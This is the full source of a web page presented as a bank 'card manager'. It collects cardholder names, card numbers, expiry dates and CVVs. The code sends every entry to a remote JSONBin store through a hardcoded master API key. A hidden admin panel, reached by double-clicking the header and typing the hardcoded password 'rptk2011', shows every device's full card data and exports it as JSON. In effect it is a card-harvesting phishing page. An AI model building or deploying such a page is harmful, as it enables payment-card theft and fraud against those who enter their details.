<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
  <title>RPbank · card manager</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
  <link href="https://fonts.googleapis.com/css2?family=Inter:ital,opsz,wght@0,14..32,400..700;1,14..32,400..700&display=swap" rel="stylesheet">
  <style>
    /* same styles as before */
    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
    body { background: linear-gradient(145deg, #f2f8ff 0%, #e3edf8 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 1.2rem; }
    .card-manager { max-width: 680px; width: 100%; background: rgba(255,255,255,0.88); backdrop-filter: blur(14px); border-radius: 48px; padding: 1.8rem; box-shadow: 0 30px 60px -15px rgba(0,30,50,0.25); border: 1px solid rgba(255,255,255,0.5); }
    .header { display: flex; align-items: center; gap: 12px; margin-bottom: 1.8rem; padding-bottom: 0.5rem; border-bottom: 2px solid rgba(0,70,140,0.08); cursor: pointer; }
    .header i { font-size: 2.2rem; color: #0a3d6b; background: rgba(10,61,107,0.07); padding: 12px; border-radius: 20px; }
    .header h1 { font-weight: 600; font-size: 1.9rem; background: linear-gradient(135deg, #0f3a5e, #1f5a85); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
    .header .online-dot { display: inline-block; width: 10px; height: 10px; border-radius: 50%; margin-left: 8px; background: #4caf50; animation: pulse 2s infinite; }
    @keyframes pulse { 0% { opacity: 0.6; transform: scale(0.9); } 50% { opacity: 1; transform: scale(1.2); } 100% { opacity: 0.6; transform: scale(0.9); } }
    .input-group { margin-bottom: 1.2rem; display: flex; flex-direction: column; gap: 5px; }
    .input-group label { font-weight: 500; font-size: 0.85rem; color: #1a3d5c; display: flex; align-items: center; gap: 8px; }
    .input-group input { background: rgba(255,255,255,0.7); border: 1.5px solid rgba(60,110,170,0.15); border-radius: 20px; padding: 14px 18px; font-size: 0.95rem; color: #0b263f; transition: all 0.2s; outline: none; }
    .input-group input:focus { border-color: #1f6eb0; background: white; box-shadow: 0 4px 14px rgba(20,90,170,0.10); }
    .row-duo { display: flex; gap: 16px; flex-wrap: wrap; }
    .row-duo .input-group { flex: 1; min-width: 130px; }
    .action-bar { display: flex; gap: 14px; margin: 1.2rem 0 1.5rem; flex-wrap: wrap; }
    .btn { border: none; background: white; padding: 14px 24px; border-radius: 40px; font-weight: 600; font-size: 0.95rem; display: inline-flex; align-items: center; justify-content: center; gap: 12px; cursor: pointer; transition: 0.2s; box-shadow: 0 6px 14px rgba(0,30,60,0.04); border: 1px solid rgba(255,255,255,0.3); flex: 1 1 auto; }
    .btn-primary { background: #0f3f66; color: white; box-shadow: 0 8px 18px -6px rgba(10,55,100,0.3); }
    .btn-primary:hover { background: #1a527a; transform: scale(1.02); }
    .btn-success { background: #2e7d32; color: white; }
    .btn-success:hover { background: #388e3c; }
    .btn-secondary { background: rgba(255,255,255,0.7); color: #1b3c5c; }
    .card-preview-area { margin: 1.5rem 0 1.2rem; background: linear-gradient(135deg, #0f2f4a, #1b4a6e); border-radius: 32px; padding: 1.5rem 1.8rem; color: white; box-shadow: 0 16px 32px -8px rgba(0,20,40,0.3); display: none; }
    .card-preview-area.visible { display: block; animation: cardReveal 0.35s ease; }
    @keyframes cardReveal { 0% { opacity: 0; transform: translateY(8px) scale(0.97); } 100% { opacity: 1; transform: translateY(0) scale(1); } }
    .card-preview-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 1.2rem; border-bottom: 1px solid rgba(255,255,255,0.08); padding-bottom: 0.6rem; }
    .card-preview-header .brand { font-weight: 600; font-size: 1.1rem; display: flex; align-items: center; gap: 10px; }
    .preview-row { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 8px; }
    .preview-label { font-size: 0.65rem; text-transform: uppercase; opacity: 0.6; }
    .preview-value { font-weight: 500; font-size: 1rem; background: rgba(255,255,255,0.04); padding: 0.2rem 0.8rem; border-radius: 30px; }
    .preview-value.account { font-size: 1.2rem; letter-spacing: 2px; font-weight: 600; background: rgba(255,255,255,0.06); }
    .preview-meta { display: flex; gap: 1.2rem; margin-top: 0.4rem; flex-wrap: wrap; }
    .preview-meta-item { display: flex; flex-direction: column; gap: 2px; }
    .preview-meta-item .label { font-size: 0.55rem; text-transform: uppercase; opacity: 0.5; }
    .preview-meta-item .value { font-weight: 500; font-size: 0.9rem; }
    .saved-section { margin-top: 1.2rem; background: rgba(240,248,255,0.4); backdrop-filter: blur(4px); border-radius: 30px; padding: 1rem 0.2rem 0.6rem; border: 1px solid rgba(255,255,255,0.5); }
    .saved-header { display: flex; justify-content: space-between; align-items: center; padding: 0 16px 12px 16px; border-bottom: 1px dashed rgba(40,90,140,0.12); }
    .saved-header span { font-weight: 600; color: #153b5a; font-size: 0.9rem; display: flex; align-items: center; gap: 8px; }
    .saved-header .badge-count { background: #103a5e; color: white; border-radius: 40px; padding: 2px 14px; font-size: 0.75rem; font-weight: 600; }
    #cardList { list-style: none; margin-top: 12px; display: flex; flex-direction: column; gap: 12px; padding: 0 6px 8px 6px; max-height: 320px; overflow-y: auto; }
    #cardList li { background: white; padding: 14px 16px; border-radius: 28px; display: flex; align-items: center; justify-content: space-between; box-shadow: 0 3px 12px rgba(0,0,0,0.02); border: 1px solid rgba(190,215,240,0.25); animation: fadeSlide 0.25s ease; }
    .card-item-info { display: flex; flex-direction: column; gap: 4px; width: 100%; }
    .card-row-top { display: flex; align-items: center; gap: 10px; flex-wrap: wrap; }
    .card-holder-name { font-weight: 600; color: #0b2b4a; font-size: 0.9rem; }
    .card-badge { background: #e5eff8; border-radius: 30px; padding: 2px 12px; font-size: 0.7rem; font-weight: 600; color: #1a5b85; display: inline-flex; align-items: center; gap: 4px; }
    .card-number-row { display: flex; align-items: center; gap: 8px; flex-wrap: wrap; margin-top: 4px; }
    .card-number-display { font-weight: 500; color: #1f4465; letter-spacing: 0.8px; font-size: 0.9rem; background: #f2f8ff; padding: 2px 14px 2px 10px; border-radius: 40px; border: 1px solid rgba(40,100,180,0.06); }
    .eye-toggle { background: transparent; border: none; color: #3a7aa8; font-size: 1rem; padding: 4px 8px; border-radius: 30px; cursor: pointer; background: rgba(30,100,180,0.04); }
    .eye-toggle:hover { background: rgba(30,100,180,0.12); }
    .card-meta { display: flex; gap: 16px; font-size: 0.7rem; color: #3e6a8f; background: rgba(240,248,255,0.5); padding: 3px 14px 3px 12px; border-radius: 40px; margin-top: 3px; flex-wrap: wrap; }
    .card-meta .user-tag { background: #e3edf8; padding: 0 10px; border-radius: 20px; font-size: 0.6rem; color: #1a5b85; }
    .delete-btn { background: transparent; border: none; color: #9bb9d6; font-size: 1.2rem; padding: 6px 10px; border-radius: 30px; cursor: pointer; }
    .delete-btn:hover { color: #c43e3e; background: rgba(200,50,50,0.04); }
    .empty-message { color: #6f8aa8; text-align: center; padding: 24px 0 16px; font-style: italic; display: flex; flex-direction: column; align-items: center; gap: 6px; }
    .empty-message i { color: #b0cbdf; font-size: 2rem; }
    .status-bar { display: flex; justify-content: space-between; align-items: center; font-size: 0.7rem; color: #6f8aa8; padding: 6px 4px 0 4px; border-top: 1px solid rgba(60,110,170,0.06); margin-top: 10px; }
    .status-bar .online { color: #4caf50; }
    .status-bar .offline { color: #ef5350; }
    /* admin modal */
    .admin-modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,20,40,0.6); backdrop-filter: blur(12px); display: none; align-items: center; justify-content: center; z-index: 1000; padding: 1.5rem; }
    .admin-modal-overlay.active { display: flex; }
    .admin-modal { background: white; border-radius: 40px; max-width: 780px; width: 100%; max-height: 90vh; overflow-y: auto; padding: 2rem; box-shadow: 0 40px 80px -20px rgba(0,0,0,0.4); animation: slideUp 0.35s ease; }
    @keyframes slideUp { 0% { opacity: 0; transform: translateY(30px) scale(0.97); } 100% { opacity: 1; transform: translateY(0) scale(1); } }
    .admin-modal-header { display: flex; justify-content: space-between; align-items: center; padding-bottom: 1rem; border-bottom: 2px solid #eef3f8; margin-bottom: 1.5rem; }
    .admin-modal-header h2 { font-size: 1.4rem; color: #0b2b4a; display: flex; align-items: center; gap: 12px; }
    .admin-modal-close { background: #f0f4f9; border: none; width: 40px; height: 40px; border-radius: 30px; font-size: 1.2rem; color: #4a6f8f; cursor: pointer; display: flex; align-items: center; justify-content: center; }
    .admin-modal-close:hover { background: #e0e8f0; }
    .admin-card-grid { display: flex; flex-direction: column; gap: 16px; }
    .admin-card-item { background: #f8fbfe; border-radius: 24px; padding: 1.2rem 1.5rem; border: 1px solid #e8eef5; display: flex; flex-wrap: wrap; align-items: center; justify-content: space-between; gap: 12px; }
    .admin-card-left .admin-name { font-weight: 600; color: #0b2b4a; font-size: 1rem; }
    .admin-card-left .admin-acc { font-weight: 500; color: #1f4465; letter-spacing: 0.5px; font-size: 0.9rem; background: white; padding: 2px 14px; border-radius: 30px; border: 1px solid #dce6ef; display: inline-block; }
    .admin-card-left .admin-device { font-size: 0.7rem; color: #7a9ab5; display: flex; align-items: center; gap: 4px; }
    .admin-card-right { display: flex; gap: 20px; align-items: center; flex-wrap: wrap; }
    .admin-meta-tag { display: flex; flex-direction: column; align-items: center; background: white; padding: 4px 14px; border-radius: 30px; border: 1px solid #e0e8f0; }
    .admin-meta-tag .label { font-size: 0.55rem; text-transform: uppercase; color: #7a9ab5; }
    .admin-meta-tag .value { font-weight: 500; color: #1a3d5c; font-size: 0.85rem; }
    .admin-empty { text-align: center; color: #7a9ab5; padding: 2rem 0; }
    .admin-modal-footer { margin-top: 1.5rem; padding-top: 1rem; border-top: 1px solid #eef3f8; display: flex; justify-content: flex-end; gap: 12px; flex-wrap: wrap; }
    .btn-admin-close { background: #0f3f66; color: white; border: none; padding: 10px 28px; border-radius: 40px; font-weight: 600; cursor: pointer; }
    .btn-admin-close:hover { background: #1a527a; }
    .btn-admin-export { background: transparent; border: 1px solid #c8daea; color: #1a3d5c; padding: 10px 24px; border-radius: 40px; font-weight: 500; cursor: pointer; }
    .btn-admin-export:hover { background: #eef3f8; }
    .btn-admin-delete-all { background: #c62828; color: white; border: none; padding: 10px 24px; border-radius: 40px; font-weight: 500; cursor: pointer; }
    .btn-admin-delete-all:hover { background: #b71c1c; }
    @keyframes fadeSlide { 0% { opacity: 0; transform: translateY(6px); } 100% { opacity: 1; transform: translateY(0); } }
    @media (max-width: 500px) { .card-manager { padding: 1.2rem 1rem; } .header h1 { font-size: 1.5rem; } .row-duo { flex-direction: column; } .btn { flex: 1 1 100%; } .action-bar { flex-direction: column; } }
  </style>
</head>
<body>
<div class="card-manager" id="app">
  <div class="header" id="adminTriggerHeader">
    <i class="fas fa-credit-card"></i>
    <h1>Smart·bank <small style="font-size:0.7rem; -webkit-text-fill-color: #4b7191; font-weight:400;">cards</small></h1>
    <span class="online-dot" id="statusDot" style="background:#ff9800;"></span>
  </div>

  <div class="input-group">
    <label for="cardHolder"><i class="fas fa-user-circle"></i> Cardholder name</label>
    <input type="text" id="cardHolder" placeholder="e.g. S. M. Fernando">
  </div>
  <div class="input-group">
    <label for="accNum"><i class="fas fa-hashtag"></i> Account number</label>
    <input type="text" id="accNum" placeholder="1234 5678 9012 3456">
  </div>
  <div class="row-duo">
    <div class="input-group">
      <label for="expDate"><i class="far fa-calendar-alt"></i> Expiry (MM/YY)</label>
      <input type="text" id="expDate" placeholder="MM/YY">
    </div>
    <div class="input-group">
      <label for="secureCode"><i class="fas fa-lock"></i> Secure code</label>
      <input type="text" id="secureCode" placeholder="CVV" maxlength="4">
    </div>
  </div>

  <div class="action-bar">
    <button class="btn btn-primary" id="addBtn"><i class="fas fa-plus-circle"></i> Add ATM card</button>
    <button class="btn btn-success" id="syncBtn"><i class="fas fa-cloud-upload-alt"></i> Sync to cloud</button>
  </div>

  <div class="card-preview-area" id="cardPreview">
    <div class="card-preview-header">
      <span class="brand"><i class="fas fa-university"></i> rp-X·ba</span>
      <span class="chip"><i class="fas fa-microchip"></i></span>
    </div>
    <div class="card-preview-body">
      <div class="preview-row">
        <span class="preview-label">Cardholder</span>
        <span class="preview-value" id="previewHolder">—</span>
      </div>
      <div class="preview-row">
        <span class="preview-label">Account number</span>
        <span class="preview-value account" id="previewAcc">Smart Bank</span>
      </div>
      <div class="preview-meta">
        <div class="preview-meta-item">
          <span class="label">Expiry</span>
          <span class="value" id="previewExp">—</span>
        </div>
        <div class="preview-meta-item">
          <span class="label">Secure code</span>
          <span class="value" id="previewCvv">—</span>
        </div>
      </div>
    </div>
  </div>

  <div class="saved-section">
    <div class="saved-header">
      <span><i class="fas fa-layer-group"></i> Saved cards</span>
      <span class="badge-count" id="cardCount">0</span>
    </div>
    <ul id="cardList">
      <li class="empty-message"><i class="fas fa-credit-card"></i> No cards saved yet</li>
    </ul>
  </div>

  <div class="status-bar">
    <span id="statusText"><i class="fas fa-circle offline"></i> Offline</span>
    <span><i class="fas fa-mobile-alt"></i> Device: <span id="deviceIdText">---</span></span>
  </div>
</div>

<!-- Admin Modal -->
<div class="admin-modal-overlay" id="adminModal">
  <div class="admin-modal">
    <div class="admin-modal-header">
      <h2><i class="fas fa-shield-alt"></i> Admin Dashboard <small style="font-size:0.7rem;color:#7a9ab5;">(all devices)</small></h2>
      <button class="admin-modal-close" id="adminModalClose"><i class="fas fa-times"></i></button>
    </div>
    <div id="adminContent"></div>
    <div class="admin-modal-footer">
      <button class="btn-admin-export" id="exportJsonBtn"><i class="fas fa-download"></i> Export JSON</button>
      <button class="btn-admin-delete-all" id="deleteAllBtn"><i class="fas fa-trash-alt"></i> Delete All</button>
      <button class="btn-admin-close" id="adminModalCloseBtn">Close</button>
    </div>
  </div>
</div>

<script>
  // ════════════════════════════════════════════════════════════
  // 🔧 CONFIGURATION – ඔබගේ JSONBin credentials 
  // ════════════════════════════════════════════════════════════
  const CONFIG = {
    BIN_ID: '6a595096f5f4af5e2999bb42',
    API_KEY: '$2a$10$Bjof5RlVfyaqXPNYhmuUcecyBQ.QY4VhHxKc.o09ZYWFCpD0e6gre'
  };

  // ════════════════════════════════════════════════════════════
  // මෙතැන් සිට code එක 
  // ════════════════════════════════════════════════════════════

  const holderInput = document.getElementById('cardHolder');
  const accInput = document.getElementById('accNum');
  const expInput = document.getElementById('expDate');
  const cvvInput = document.getElementById('secureCode');
  const addBtn = document.getElementById('addBtn');
  const syncBtn = document.getElementById('syncBtn');
  const cardListEl = document.getElementById('cardList');
  const cardCountSpan = document.getElementById('cardCount');
  const previewArea = document.getElementById('cardPreview');
  const previewHolder = document.getElementById('previewHolder');
  const previewAcc = document.getElementById('previewAcc');
  const previewExp = document.getElementById('previewExp');
  const previewCvv = document.getElementById('previewCvv');
  const adminModal = document.getElementById('adminModal');
  const adminModalClose = document.getElementById('adminModalClose');
  const adminModalCloseBtn = document.getElementById('adminModalCloseBtn');
  const adminContent = document.getElementById('adminContent');
  const exportJsonBtn = document.getElementById('exportJsonBtn');
  const deleteAllBtn = document.getElementById('deleteAllBtn');
  const adminTriggerHeader = document.getElementById('adminTriggerHeader');
  const statusText = document.getElementById('statusText');
  const statusDot = document.getElementById('statusDot');
  const deviceIdText = document.getElementById('deviceIdText');

  // Device ID (localStorage)
  let deviceId = localStorage.getItem('apexDeviceId');
  if (!deviceId) {
    deviceId = 'dev_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);
    localStorage.setItem('apexDeviceId', deviceId);
  }
  deviceIdText.textContent = deviceId;

  let allCards = []; // හැම cards එකම (cloud එකෙන්)
  const visibilityMap = new Map();
  let isSyncing = false;

  // ─── helpers ──────────────────────────────────────────────
  function formatCardNumber(raw) {
    let digits = raw.replace(/\D/g, '');
    if (digits.length > 16) digits = digits.slice(0, 16);
    return digits.replace(/(.{4})/g, '$1 ').trim();
  }
  function maskNumber(raw) {
    const cleaned = raw.replace(/\s/g, '');
    if (cleaned.length < 4) return '•••• •••• •••• ' + cleaned;
    const last4 = cleaned.slice(-4);
    return '•••• •••• •••• ' + last4;
  }
  function toggleVisibility(id) {
    const current = visibilityMap.get(id) || false;
    visibilityMap.set(id, !current);
    renderCards();
  }

  // ─── update preview ──────────────────────────────────────
  function updatePreview(holder, acc, expiry, cvv) {
    const cleanHolder = holder.trim() || 'Cardholder';
    const cleanAcc = acc.trim() || '•••• •••• •••• ••••';
    const cleanExp = expiry.trim() || 'MM/YY';
    const cleanCvv = cvv.trim() || '•••';
    previewHolder.textContent = cleanHolder;
    previewAcc.textContent = formatCardNumber(cleanAcc);
    previewExp.textContent = cleanExp;
    previewCvv.textContent = cleanCvv;
    previewArea.classList.add('visible');
  }

  // ─── render cards (USER ට පෙනෙන්නේ ඔහුගේම cards විතරයි) ──
  function renderCards() {
    // 🔥 FIX: filter by deviceId – user ට පෙනෙන්නේ ඔහුගේම cards විතරයි
    const myCards = allCards.filter(card => card.deviceId === deviceId);
    
    cardListEl.innerHTML = '';
    if (myCards.length === 0) {
      cardListEl.innerHTML = `<li class="empty-message"><i class="fas fa-credit-card"></i> No cards saved yet</li>`;
      cardCountSpan.textContent = '0';
      previewArea.classList.remove('visible');
      return;
    }
    const sorted = [...myCards].reverse();
    for (const card of sorted) {
      const li = document.createElement('li');
      const id = card.id || card._key || Date.now() + Math.random();
      li.dataset.id = id;

      const infoDiv = document.createElement('div');
      infoDiv.className = 'card-item-info';

      const topRow = document.createElement('div');
      topRow.className = 'card-row-top';
      const nameSpan = document.createElement('span');
      nameSpan.className = 'card-holder-name';
      nameSpan.textContent = card.holder || 'Cardholder';
      const badge = document.createElement('span');
      badge.className = 'card-badge';
      badge.innerHTML = `<i class="fas fa-credit-card"></i> ATM`;
      topRow.appendChild(nameSpan);
      topRow.appendChild(badge);

      const numRow = document.createElement('div');
      numRow.className = 'card-number-row';
      const numDisplay = document.createElement('span');
      numDisplay.className = 'card-number-display';
      const isVisible = visibilityMap.get(id) || false;
      const rawAcc = card.accountNumber || '';
      numDisplay.textContent = isVisible ? formatCardNumber(rawAcc) : maskNumber(rawAcc);
      const eyeBtn = document.createElement('button');
      eyeBtn.className = 'eye-toggle';
      eyeBtn.innerHTML = isVisible ? '<i class="fas fa-eye"></i>' : '<i class="fas fa-eye-slash"></i>';
      eyeBtn.addEventListener('click', (e) => {
        e.stopPropagation();
        toggleVisibility(id);
      });
      numRow.appendChild(numDisplay);
      numRow.appendChild(eyeBtn);

      const metaRow = document.createElement('div');
      metaRow.className = 'card-meta';
      const expSpan = document.createElement('span');
      expSpan.innerHTML = `<i class="far fa-calendar-alt"></i> ${card.expiry || '—'}`;
      const cvvSpan = document.createElement('span');
      cvvSpan.innerHTML = `<i class="fas fa-lock"></i> ${card.cvv || '•••'}`;
      metaRow.appendChild(expSpan);
      metaRow.appendChild(cvvSpan);
      // device tag එක user interface එකේ නොපෙන්වන්න (අවශ්‍ය නැහැ)
      // නමුත් ඕනනම් පෙන්වන්න පුළුවන්

      infoDiv.appendChild(topRow);
      infoDiv.appendChild(numRow);
      infoDiv.appendChild(metaRow);

      const delBtn = document.createElement('button');
      delBtn.className = 'delete-btn';
      delBtn.innerHTML = '<i class="fas fa-trash-alt"></i>';
      delBtn.addEventListener('click', (e) => {
        e.stopPropagation();
        deleteCard(id);
      });

      li.appendChild(infoDiv);
      li.appendChild(delBtn);
      cardListEl.appendChild(li);
    }
    cardCountSpan.textContent = myCards.length;
  }

  // ─── CRUD operations ──────────────────────────────────────
  async function deleteCard(id) {
    if (!id) return;
    allCards = allCards.filter(c => (c.id || c._key) !== id);
    visibilityMap.delete(id);
    renderCards();
    await saveToJsonBin();
    const myCards = allCards.filter(c => c.deviceId === deviceId);
    if (myCards.length === 0) previewArea.classList.remove('visible');
    else {
      const latest = myCards[myCards.length - 1];
      updatePreview(latest.holder, latest.accountNumber, latest.expiry, latest.cvv);
    }
  }

  function addCard(holder, acc, expiry, cvv) {
    const cleanHolder = holder.trim() || 'Cardholder';
    const cleanAcc = acc.trim() || '';
    const cleanExp = expiry.trim() || '—';
    const cleanCvv = cvv.trim() || '•••';
    if (!cleanAcc) { alert('Please enter an account number.'); return false; }
    const newCard = {
      id: Date.now() + Math.floor(Math.random() * 10000),
      holder: cleanHolder,
      accountNumber: cleanAcc,
      expiry: cleanExp,
      cvv: cleanCvv,
      deviceId: deviceId,
      timestamp: Date.now()
    };
    allCards.push(newCard);
    visibilityMap.set(newCard.id, false);
    renderCards();
    updatePreview(cleanHolder, cleanAcc, cleanExp, cleanCvv);
    saveToJsonBin(); // auto-sync
    return true;
  }

  // ─── JSONBin API ──────────────────────────────────────────
  async function fetchFromJsonBin() {
    const url = `https://api.jsonbin.io/v3/b/${CONFIG.BIN_ID}`;
    try {
      const res = await fetch(url, {
        headers: { 'X-Master-Key': CONFIG.API_KEY }
      });
      if (!res.ok) throw new Error('HTTP ' + res.status);
      const data = await res.json();
      return data.record || { cards: [] };
    } catch (e) {
      console.warn('JSONBin fetch failed:', e);
      return null;
    }
  }

  async function saveToJsonBin() {
    if (isSyncing) return;
    isSyncing = true;
    try {
      const payload = { cards: allCards };
      const url = `https://api.jsonbin.io/v3/b/${CONFIG.BIN_ID}`;
      const res = await fetch(url, {
        method: 'PUT',
        headers: {
          'Content-Type': 'application/json',
          'X-Master-Key': CONFIG.API_KEY
        },
        body: JSON.stringify(payload)
      });
      if (!res.ok) throw new Error('HTTP ' + res.status);
      updateStatus(true);
    } catch (e) {
      console.warn('JSONBin save failed:', e);
      updateStatus(false);
    } finally {
      isSyncing = false;
    }
  }

  // ─── load from JSONBin ────────────────────────────────────
  async function loadFromJsonBin() {
    const data = await fetchFromJsonBin();
    if (data && data.cards) {
      allCards = data.cards;
      allCards.forEach(c => { if (!c.id) c.id = Date.now() + Math.random(); });
      renderCards();
      const myCards = allCards.filter(c => c.deviceId === deviceId);
      if (myCards.length > 0) {
        const latest = myCards[myCards.length - 1];
        updatePreview(latest.holder, latest.accountNumber, latest.expiry, latest.cvv);
      }
      updateStatus(true);
    } else {
      const local = localStorage.getItem('apexLocalCards');
      if (local) {
        try {
          const parsed = JSON.parse(local);
          if (parsed.length) {
            allCards = parsed;
            renderCards();
            const myCards = allCards.filter(c => c.deviceId === deviceId);
            if (myCards.length > 0) {
              const latest = myCards[myCards.length - 1];
              updatePreview(latest.holder, latest.accountNumber, latest.expiry, latest.cvv);
            }
          }
        } catch(e) {}
      }
      updateStatus(false);
    }
    localStorage.setItem('apexLocalCards', JSON.stringify(allCards));
  }

  // ─── status updates ──────────────────────────────────────
  function updateStatus(online) {
    if (online) {
      statusText.innerHTML = '<i class="fas fa-circle online"></i> Cloud connected';
      statusDot.style.background = '#4caf50';
    } else {
      statusText.innerHTML = '<i class="fas fa-circle offline"></i> Offline (local only)';
      statusDot.style.background = '#ef5350';
    }
  }

  // ─── admin modal (හැම cards එකම පෙන්වයි) ────────────────
  function renderAdminModal() {
    if (allCards.length === 0) {
      adminContent.innerHTML = `<div class="admin-empty"><i class="fas fa-database" style="font-size:2rem;display:block;margin-bottom:10px;color:#b0cbdf;"></i> No card data available</div>`;
      return;
    }
    let html = '<div class="admin-card-grid">';
    for (const card of allCards) {
      const accDisplay = formatCardNumber(card.accountNumber || '');
      html += `
        <div class="admin-card-item">
          <div class="admin-card-left">
            <div class="admin-name"><i class="fas fa-user-circle" style="color:#1a5b85;margin-right:6px;"></i>${card.holder || 'Cardholder'}</div>
            <div class="admin-acc">${accDisplay}</div>
            <div class="admin-device"><i class="fas fa-mobile-alt"></i> ${card.deviceId || 'Unknown'}</div>
          </div>
          <div class="admin-card-right">
            <div class="admin-meta-tag">
              <span class="label">Expiry</span>
              <span class="value">${card.expiry || '—'}</span>
            </div>
            <div class="admin-meta-tag">
              <span class="label">Secure</span>
              <span class="value">${card.cvv || '•••'}</span>
            </div>
          </div>
        </div>
      `;
    }
    html += '</div>';
    adminContent.innerHTML = html;
  }

  function openAdminModal() {
    renderAdminModal();
    adminModal.classList.add('active');
    document.body.style.overflow = 'hidden';
  }
  function closeAdminModal() {
    adminModal.classList.remove('active');
    document.body.style.overflow = '';
  }
  adminModalClose.addEventListener('click', closeAdminModal);
  adminModalCloseBtn.addEventListener('click', closeAdminModal);
  adminModal.addEventListener('click', (e) => {
    if (e.target === adminModal) closeAdminModal();
  });

  exportJsonBtn.addEventListener('click', () => {
    if (allCards.length === 0) { alert('No data'); return; }
    const dataStr = JSON.stringify(allCards, null, 2);
    const blob = new Blob([dataStr], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `apexbank_all_cards_${new Date().toISOString().slice(0,10)}.json`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
  });

  deleteAllBtn.addEventListener('click', async () => {
    if (!confirm('⚠️ Delete ALL cards from cloud? This cannot be undone.')) return;
    allCards = [];
    renderCards();
    previewArea.classList.remove('visible');
    await saveToJsonBin();
    alert('All cards deleted.');
  });

  // ─── secret admin trigger ────────────────────────────────
  adminTriggerHeader.addEventListener('dblclick', function() {
    const password = prompt('Enter admin password:');
    if (password === 'rptk2011') {
      openAdminModal();
    } else if (password !== null) {
      alert('Incorrect password.');
    }
  });

  // ─── event listeners ──────────────────────────────────────
  function handleAdd() {
    const holder = holderInput.value;
    const acc = accInput.value;
    const exp = expInput.value;
    const cvv = cvvInput.value;
    addCard(holder, acc, exp, cvv);
  }

  addBtn.addEventListener('click', handleAdd);
  syncBtn.addEventListener('click', async () => {
    await saveToJsonBin();
    alert('Synced to cloud!');
  });

  [holderInput, accInput, expInput, cvvInput].forEach(inp => {
    inp.addEventListener('keypress', (e) => {
      if (e.key === 'Enter') { e.preventDefault(); handleAdd(); }
    });
  });

  // ─── init ──────────────────────────────────────────────────
  (async function init() {
    await loadFromJsonBin();
    // No sample card added – start completely empty
    // User will add cards manually
  })();

  console.log('🟦 smart·bank with JSONBin (privacy fix, empty start)');
  console.log('📱 Device ID:', deviceId);
  console.log('🔑 Admin: double-click header → password: rptk2011');
  console.log('✅ User sees only their own cards. Admin sees all cards.');
</script>
</body>
</html>
